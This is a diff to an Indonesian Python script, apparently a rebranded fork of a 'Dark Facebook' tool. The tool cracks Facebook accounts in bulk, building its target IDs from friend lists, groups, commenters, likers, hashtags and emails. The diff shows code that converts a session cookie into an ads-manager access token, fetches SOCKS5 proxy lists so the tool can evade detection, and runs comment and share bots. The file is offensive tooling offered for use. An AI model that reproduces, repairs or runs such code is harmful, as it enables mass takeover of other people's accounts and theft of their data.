@@ -74,6 +74,7 @@ try:
 	from fake_useragent import UserAgent
 	from inquirer.themes import Default
 	from concurrent.futures import ThreadPoolExecutor
+	from datetime import datetime
 	console = Console()
 	try:
 		null = open(os.devnull, "w")
@@ -156,7 +157,7 @@ all_waktu=(f"{detik}-{menit}-{jam}")
 
 #""" GET VISITOR"""
 try:
-	visitor=request.urlopen("https://api.countapi.xyz/hit/dumai-991/dark-fb")
+	visitor=request.urlopen("https://api.countapi.xyz/hit/denventa/dark-kachyusa")
 	ka=json.loads(visitor.read())
 except:pass
 
@@ -339,10 +340,10 @@ def cek_key():
 
 class logo:
 	def __init__(self):
-		my_logo = f"""{MM} ____   _____  _____  _____    {QQ}_____ _____ _____ _____ __ __ _____ _____ _____ 
-{MM}|    \ |  _  || __  ||  |  |  {QQ}|  |  |  _  |     |  |  |  |  |  |  |   __|  _  |
-{MM}|  |  ||     ||    -||    -|  {QQ}|    -|     |   --|     |_   _|  |  |__   |     |
-{MM}|____/ |__|__||__|__||__|__|  {QQ}|__|__|__|__|_____|__|__| |_| |_____|_____|__|__|
+		my_logo = f"""{MM} ____   _____  _____  _____    {QQ}_____  _____  _____  _____  _____  _____  _____  _____
+{MM}|    \ |  _  || __  ||  |  |  {QQ}|   __||  _  ||     ||   __|| __  ||     ||     ||  |  |
+{MM}|  |  ||     ||    -||    -|  {QQ}|   __||     ||   --||   __|| __ -||  |  ||  |  ||    -|
+{MM}|____/ |__|__||__|__||__|__|  {QQ}|__|   |__|__||_____||_____||_____||_____||_____||__|__|
 			 {QQ}Author      : {II}Risky [ github.com/Dumai-991 ]
 			 {QQ}Developer   : {II}Denventa             
 			 {QQ}Github      : {II}github.com/Denventa  
@@ -525,13 +526,6 @@ class login:
 				self.menu_login()
 		else:
 			if jks in ("1","01"):self.login_cookies();quit()
-			elif jks in ("2","02"):menu_belum_ada();self.menu_login()
-			elif jks in ("3","03"):menu_belum_ada();self.menu_login()
-			elif jks in ("4","04"):kata_free();quit()
-			elif jks in ("5","05"):menu_belum_ada();self.menu_login()
-			elif jks in ("6","06"):kata_free();quit()
-			elif jks in ("7","07"):menu_belum_ada();self.menu_login()
-#			elif jks in ("",""):
 #			elif jks in ("",""):
 			elif jks in ("00","000"):quit()
 			else:
@@ -551,10 +545,11 @@ class menu:
 #			login().cek_kukis()
 		except:login().menu_login()
 		try:
-			yz  = requests.Session().get('https://graph.facebook.com/%s?fields=name,id&access_token=%s'%("me",codeteam["token"]),cookies={"cookie":codeteam["cookie"]})
+			yz  = requests.Session().get('https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s'%("me",codeteam["token"]),cookies={"cookie":codeteam["cookie"]})
 			zxc = json.loads(yz.text)
 			nama= zxc["name"]
 			id  = zxc["id"]
+			bd = zxc["birthday"]
 		except:login().menu_login()
 		if status_key == "Admin":
 			my_status = "Admin"
@@ -563,12 +558,17 @@ class menu:
 			for x in range(jmlh_kata):end_key += "*"
 			key_ = my_key[0]+"-"+end_key+"-"+my_key[2]
 		else:my_status = "Member Biasa";key_ = "Member"
-		tampilan_data = f"""{WOR} Nama Akun   : {PP}{nama}{QQ}
-{WOR} Username/ID : {PP}{id}{QQ}"""
-		tampilan_statuss = """{WOR} Status : {my_status}
-{WOR} Key    : {key_}"""
-		_tomas.append(Panel(tampilan_data,width=42,title=f"{GOD}{PP}Account Information{GOD}",style=f"{A}"))
-		_tomas.append(Panel(tampilan_data,width=45,title=f"{GOD}{PP}Status Information{GOD}",style=f"{A}"))
+		tampilan_data = f"""{WOR} Name      : {KK}{nama}{QQ}
+{WOR} Your ID   : {KK}{id}{QQ}
+{WOR} Status    : {JJ}Premium 7 Days
+{WOR} Birthday  : {KK}{bd}
+{WOR} Login Date: {KK}{datetime.now().strftime('%A %d-%m-%Y')}""";api = requests.get('http://ip-api.com/json').json();time = f"""{WOR} iP        : {PP}{api['query']}
+{WOR} Country   : {KK}{api['country']}
+{WOR} City      : {KK}{api['city']}
+{WOR} Isp       : {KK}{api['isp']}
+{WOR} Time      : {KK}{datetime.now().strftime('%H:%M')}"""
+		_tomas.append(Panel(tampilan_data,width=42,title=f"{GOD}{PP}Account{GOD}",style=f"{A}"))
+		_tomas.append(Panel(time,width=45,title=f"{GOD}{PP}Status{GOD}",style=f"{A}"))
 		console.print(Columns(_tomas))
 
 
@@ -586,16 +586,16 @@ class menu:
 			OQ = HH
 		try:ads = requests.get('https://www.facebook.com/adsmanager/manage/campaigns', cookies={'cookie':codeteam["cookie"]});url = requests.get('https://www.facebook.com/adsmanager/manage/campaigns?act='+ re.search('act=(.*?)&nav_source',str(ads.content)).group(1) +'&nav_source=no_referrer', cookies={'cookie':codeteam["cookie"]});mytok.append(re.search('accessToken="(.*?)"',str(url.content)).group(1))
 		except:exit('Failled Convert Cookie')
-		tampilan_menu = f"""   {QQ}[{CC}01{QQ}] {PP}Crack From Teman Sendiri   {QQ}[{CC}04{QQ}] {PP}Crack From Public   {QQ}[{CC}07{QQ}] {PP}Crack From Follow
-   {QQ}[{CC}02{QQ}] {PP}Crack From Search Name     {QQ}[{CC}05{QQ}] {PP}Crack From Email    {QQ}[{CC}08{QQ}] {PP}Crack From Group
-   {QQ}[{CC}03{QQ}] {PP}Crack From Komen           {QQ}[{CC}06{QQ}] {PP}Crack From Liker    {QQ}[{CC}09{QQ}] {PP}Crack From Hastag"""
-		tampilan_tools = f"""   {QQ}[{CC}10{QQ}] {PP}Check Options Akun CP
-   {QQ}[{CC}11{QQ}] {PP}Check Jumlah Teman
-   {QQ}[{CC}12{QQ}] {PP}Aktifkan Private Akun
+		tampilan_menu = f"""   {QQ}[{CC}01{QQ}] {UU}Friendlist                 {QQ}[{CC}04{QQ}] {UU}ID Random           {QQ}[{CC}07{QQ}] {UU}Followers
+   {QQ}[{CC}02{QQ}] {AA}Nama                       {QQ}[{CC}05{QQ}] {UU}Email               {QQ}[{CC}08{QQ}] {AA}Grup
+   {QQ}[{CC}03{QQ}] {AA}Komentar                   {QQ}[{CC}06{QQ}] {AA}Likers              {QQ}[{CC}09{QQ}] {AA}Hashtag"""
+		tampilan_tools = f"""   {QQ}[{CC}10{QQ}] {AA}Cek Opsi Akun CP
+   {QQ}[{CC}11{QQ}] {AA}Cek Teman
+   {QQ}[{CC}12{QQ}] {AA}Cek Hasil
    {QQ}[{CC}00{QQ}] {PP}Keluar"""
-		tampilan_lain = f"""   {QQ}[{CC}13{QQ}] {PP}Check Hasil Crack
-   {QQ}[{CC}14{QQ}] {PP}Bot Komen
-   {QQ}[{CC}15{QQ}] {PP}Bot Share
+		tampilan_lain = f"""   {QQ}[{CC}13{QQ}] {AA}FB Developer
+   {QQ}[{CC}14{QQ}] {AA}Bot Komen
+   {QQ}[{CC}15{QQ}] {AA}Bot Share
    {QQ}[{MM}00{QQ}] {QQ}Keluar"""
 		torop_.append(Panel(tampilan_menu,width=90,title=f"{GOD}{OO}Menu{GOD}",style=f"{A}"))
 		torop.append(Panel(tampilan_tools,width=45,title=f"{GOD}{CC}Tools{GOD}",style=f"{A}",subtitle_align='left',subtitle=f"┏{KK}SILAHKAN PILIH"))
@@ -891,6 +891,7 @@ class crack:
 			"https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks5.txt",
 			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt"
 			'https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all'
+			'https://raw.githubusercontent.com/Denventa/sakera/main/ua.txt'
 			]
 		try:
 #			for link in link_prox:
@@ -1221,4 +1222,3 @@ if "hai" == "hai":
 	except:os.sys.exit("* Makanya Jangan Rikod Sc Orang")
 	folder()
 	menu().daftar_menu()
-
